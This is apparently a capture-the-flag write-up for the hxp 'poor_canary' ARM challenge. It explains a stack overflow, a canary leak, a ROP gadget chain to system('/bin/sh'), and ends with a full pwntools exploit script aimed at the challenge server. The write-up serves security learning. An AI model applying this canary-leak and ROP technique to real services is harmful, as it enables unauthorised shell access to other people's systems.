# poor_canary

poor_canary is a statically linked ARM binary which echoes input.

```
root@DESKTOP-HUPC6JQ:/mnt/c/Users/Benni/hxpctf/poor_canary# file canary
canary: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=3599326b9bf146191588a1e13fb3db905951de07, not stripped
```

The original source code was provided as well, so we can see that (and why) the binary contains `system`:
```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

int main()
{
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    char buf[40];
    puts("Welcome to hxp's Echo Service!");
    while (1)
    {
        printf("> ");
        ssize_t len = read(0, buf, 0x60);
        if (len <= 0) return 0;
        if (buf[len - 1] == '\n') buf[--len] = 0;
        if (len == 0) return 0;
        puts(buf);
    }
}
const void* foo = system;
```

The binary is not position independent:
```
root@DESKTOP-HUPC6JQ:/mnt/c/Users/Benni/hxpctf/poor_canary# checksec canary
[*] '/mnt/c/Users/Benni/hxpctf/poor_canary/canary'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
```

so IDA can tell us the virtual address where `system` is (0x00016D90).

The buffer `buf` on the stack is 40 bytes long, but `read` will read 0x60 (96) bytes - a classical overflow where we can override the return address. A quick debugging session enlightens us that the return address is 12 bytes behind the canary.

Since the stack is protected by a canary, we have to leak it first. Since canaries always begin with a `00`, we have to send 41 characters to retrieve the canary:
```python
io.send("A"*41)
resp = io.recvline()
canary = '\x00' + resp[43:-1]
```

In order to execute `system("/bin/sh"), we need that string somewhere:
```
root@DESKTOP-HUPC6JQ:/mnt/c/Users/Benni/hxpctf/poor_canary# ropper -f canary --string "/bin/sh"


Strings
=======

Address     Value
-------     -----
0x00071eb0  /bin/sh
```

So far so good, now we have to move the address into r0 (first argument is in r0):
```
root@DESKTOP-HUPC6JQ:/mnt/c/Users/Benni/hxpctf/poor_canary# ropper -f canary --nocolor | fgrep ": pop {r0"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x0005ab20: pop {r0, r1, r2, r3, ip, lr}; ldr r1, [r0, #4]; bx r1;
0x0005a120: pop {r0, r1, r2, r3, r4, lr}; bx ip;
0x0005ab04: pop {r0, r1, r3, ip, lr}; pop {r2}; ldr r1, [r0, #4]; bx r1;
0x00026b7c: pop {r0, r4, pc};
```

`pop {r0, r4, pc}` looks good: it pops into r0 **and** pc, so it does everything we need! We just have to
- write 40 bytes of garbage
- write the canary
- write 12 bytes of garbage
- write the address of our pop gadget (0x00026b7c)
- write the address of "/bin/sh" (0x00071eb0) (which will be popped into r0)
- write 4 bytes of garbage (which will be popped into r4)
- write the address of system (which will be popped into pc)
and the pc will point to `system`, r0 will point to `/bin/sh`, and thus we will have a shell!

```python
io.send("A"*40 + canary + "A"*12 + "\x7c\x6b\x02\x00" + "\xb0\x1e\x07\x00" + "A"*4 + "\x90\x6D\x01\x00")
```





Our full exploit script:
```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 116.203.30.62 --port 18113 ./canary
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./canary')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '116.203.30.62'
port = int(args.PORT or 18113)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     arm-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x10000)

io = start()
io.recvline()

# read canary
io.send("A"*41)
resp = io.recvline()
canary = '\x00' + resp[43:-1]

# GOGOGO
io.send("A"*40 + canary + "A"*12 + "\x7c\x6b\x02\x00" + "\xb0\x1e\x07\x00" + "A"*4 + "\x90\x6D\x01\x00")
io.interactive()
```
